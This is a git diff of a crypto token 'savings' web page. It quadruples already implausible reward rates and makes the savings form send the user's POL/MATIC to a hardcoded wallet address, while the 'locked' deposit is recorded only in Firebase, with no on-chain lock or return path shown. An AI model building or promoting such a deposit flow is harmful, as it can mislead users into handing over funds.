@@ -8,6 +8,8 @@
   <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400;700&display=swap" rel="stylesheet" />
   <!-- Materialize CSS for modern mobile look -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css" rel="stylesheet" />
+  <!-- ethers.js for wallet & transaction -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
@@ -175,7 +177,6 @@
       font-weight: 700;
       letter-spacing: 0.02em;
     }
-    /* GRID DISPLAY STYLES FOR SAVINGS */
     #savingsGrid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
@@ -376,9 +377,9 @@
     </div>
     <div class="fix-rate-info">
       <strong>Fixed Rates:</strong><br>
-      <span>1T $NFTFAN</span> per <span>1 $POL</span> for <span>3 Months</span> &nbsp;|&nbsp;
-      <span>100T $NFTFAN</span> per <span>1 $POL</span> for <span>6 Months</span> &nbsp;|&nbsp;
-      <span>250T $NFTFAN</span> per <span>1 $POL</span> for <span>1 Year</span>
+      <span>4T $NFTFAN</span> per <span>1 $POL</span> for <span>3 Months</span> &nbsp;|&nbsp;
+      <span>400T $NFTFAN</span> per <span>1 $POL</span> for <span>6 Months</span> &nbsp;|&nbsp;
+      <span>1,000T $NFTFAN</span> per <span>1 $POL</span> for <span>1 Year</span>
     </div>
     <form id="savingsForm" autocomplete="off">
       <div class="input-field">
@@ -392,9 +393,9 @@
       <div class="input-field" style="margin-bottom: 0;">
         <select id="duration" required>
           <option value="" disabled selected>Choose duration</option>
-          <option value="3">3 Months (1T per 1 $POL)</option>
-          <option value="6">6 Months (100T per 1 $POL)</option>
-          <option value="12">1 Year (250T per 1 $POL)</option>
+          <option value="3">3 Months (4T per 1 $POL)</option>
+          <option value="6">6 Months (400T per 1 $POL)</option>
+          <option value="12">1 Year (1,000T per 1 $POL)</option>
         </select>
         <label for="duration">Lock Period</label>
       </div>
@@ -443,37 +444,8 @@
     let currentWallet = null;
     let currentNetwork = null;
 
-    document.getElementById('connectWalletBtn').onclick = async function() {
-      if (!window.ethereum) {
-        M.toast({html: 'No wallet found. Please install MetaMask!', classes: 'red'});
-        return;
-      }
-      try {
-        await switchToPolygon();
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        currentWallet = accounts[0];
-        currentNetwork = await getNetworkName();
-        displayWallet(currentWallet, currentNetwork);
-        await saveWalletToFirebase(currentWallet);
-
-        window.ethereum.on('accountsChanged', async (accounts) => {
-          currentWallet = accounts[0] || null;
-          displayWallet(currentWallet, currentNetwork);
-          if (currentWallet) await saveWalletToFirebase(currentWallet);
-          await loadSavings();
-        });
-        window.ethereum.on('chainChanged', async () => {
-          currentNetwork = await getNetworkName();
-          displayWallet(currentWallet, currentNetwork);
-          await loadSavings();
-        });
-        await loadSavings();
-      } catch (err) {
-        M.toast({html: 'Wallet connection failed', classes: 'red'});
-      }
-    };
-
     async function switchToPolygon() {
+      if (!window.ethereum) return;
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
@@ -498,6 +470,38 @@
       return 'Unknown';
     }
 
+    document.getElementById('connectWalletBtn').onclick = async function() {
+      if (!window.ethereum) {
+        M.toast({html: 'No wallet found. Please install MetaMask!', classes: 'red'});
+        return;
+      }
+      try {
+        await switchToPolygon();
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        currentWallet = accounts[0];
+        currentNetwork = await getNetworkName();
+
+        displayWallet(currentWallet, currentNetwork);
+        await saveWalletToFirebase(currentWallet);
+
+        window.ethereum.on('accountsChanged', async (accounts) => {
+          currentWallet = accounts[0] || null;
+          currentNetwork = await getNetworkName();
+          displayWallet(currentWallet, currentNetwork);
+          if (currentWallet) await saveWalletToFirebase(currentWallet);
+          await loadSavings();
+        });
+        window.ethereum.on('chainChanged', async () => {
+          currentNetwork = await getNetworkName();
+          displayWallet(currentWallet, currentNetwork);
+          await loadSavings();
+        });
+        await loadSavings();
+      } catch (err) {
+        M.toast({html: 'Wallet connection failed', classes: 'red'});
+      }
+    };
+
     function displayWallet(wallet, network) {
       const walletDiv = document.getElementById('connectedWalletDisplay');
       const walletSpan = document.getElementById('connectedWallet');
@@ -521,11 +525,11 @@
       });
     }
 
-    // Reward calculation based on fixed rates
+    // Reward calculation based on fixed rates (4x)
     function getReward(amount, durationMonths) {
-      if (durationMonths === 3) return `${(amount * 1_000_000_000_000).toLocaleString()} $NFTFAN`;
-      if (durationMonths === 6) return `${(amount * 100_000_000_000_000).toLocaleString()} $NFTFAN`;
-      if (durationMonths === 12) return `${(amount * 250_000_000_000_000).toLocaleString()} $NFTFAN`;
+      if (durationMonths === 3) return `${(amount * 4_000_000_000_000).toLocaleString()} $NFTFAN`;
+      if (durationMonths === 6) return `${(amount * 400_000_000_000_000).toLocaleString()} $NFTFAN`;
+      if (durationMonths === 12) return `${(amount * 1_000_000_000_000_000).toLocaleString()} $NFTFAN`;
       return "0 $NFTFAN";
     }
 
@@ -726,20 +730,35 @@
         M.toast({html: 'Enter a valid X (Twitter) username.', classes: 'red'});
         return;
       }
-      if (!currentWallet) {
-        M.toast({html: 'Please connect your wallet first.', classes: 'red'});
+      // Wallet connect and switch network if needed
+      if (!window.ethereum) {
+        M.toast({html: 'No wallet found. Please install MetaMask!', classes: 'red'});
         return;
       }
-      if (currentNetwork !== 'Polygon') {
-        M.toast({html: 'Please switch to Polygon network in your wallet.', classes: 'red'});
+      try {
+        await switchToPolygon();
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        // Send to vault
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const recipient = "0x92d550cdbc234211957bd1b579d962c885a127ba";
+        const tx = await signer.sendTransaction({
+          to: recipient,
+          value: ethers.utils.parseEther(amount.toString())
+        });
+        M.toast({html: 'Transaction sent! Waiting for confirmation.', classes: 'green'});
+        await tx.wait();
+      } catch (err) {
+        M.toast({html: 'Transaction failed or denied.', classes: 'red'});
         return;
       }
+      // Now, proceed with saving to Firebase
       await saveSavingsToFirebase(currentWallet, amount, duration, xAccountRaw);
       await loadSavings();
       amountInput.value = "";
       durationInput.value = "";
       xAccountInput.value = "";
-      M.toast({html: 'Savings created! $POL locked.', classes: 'green'});
+      M.toast({html: 'Savings created and MATIC sent!', classes: 'green'});
     });
 
     window.addEventListener('DOMContentLoaded', async () => {
